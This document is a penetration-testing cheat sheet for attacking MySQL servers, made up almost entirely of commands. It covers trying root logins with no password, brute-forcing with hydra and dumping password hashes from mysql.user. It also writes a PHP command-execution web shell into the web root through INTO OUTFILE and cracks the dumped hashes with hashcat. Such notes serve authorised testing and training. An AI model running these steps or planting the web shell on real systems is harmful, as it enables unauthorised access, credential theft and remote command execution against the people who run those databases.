# MySQL (3306)

!!! tip "Start here"
    Try root with no password first: `mysql -h $IP -u root` (no `-p` flag). Many dev and staging instances have no root password set. If you get in and the user has `FILE` privilege, you can write a web shell directly to the web root.

---

## Enumeration

```bash
nmap -sV -p 3306 --script mysql-info $IP
```

---

## Authentication

```bash
mysql -h $IP -u root
mysql -h $IP -u $USERNAME -p
```

!!! tip "TLS compatibility"
    If you get a TLS error, add `--ssl-mode=DISABLED` (MySQL 5.7+) or `--skip-ssl` (MariaDB).

---

## Brute Force

```bash
hydra -L users.txt -P passwords.txt mysql://$IP
```

---

## Enumeration Queries

```sql
SELECT user, host FROM mysql.user;                          -- list users
SHOW GRANTS FOR CURRENT_USER;                              -- current privileges
SHOW VARIABLES LIKE 'secure_file_priv';                   -- allowed file-write directory
SHOW DATABASES;
USE DATABASE_NAME; SHOW TABLES;
SELECT * FROM TABLE_NAME;
SELECT host, user, authentication_string FROM mysql.user;  -- dump password hashes
```

---

## File Write (FILE Privilege)

If the MySQL user has `FILE` privilege, write a web shell:

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

`INTO OUTFILE` requires the `FILE` privilege, cannot overwrite an existing file, and is restricted by `secure_file_priv` when that variable is set. Access the result at `http://$IP/shell.php?cmd=id` only when the selected directory is actually served by the web application.

Dump a table to disk:

```sql
SELECT * FROM TABLE_NAME INTO OUTFILE '/tmp/dump.txt';
```

---

## Hash Cracking

```bash
hashcat -m 300 hashes.txt /usr/share/wordlists/rockyou.txt
```

Mode `300` applies to MySQL 4.1/5 `mysql_native_password` hashes. Identify the hash format before selecting a mode; newer authentication plugins do not use this format.
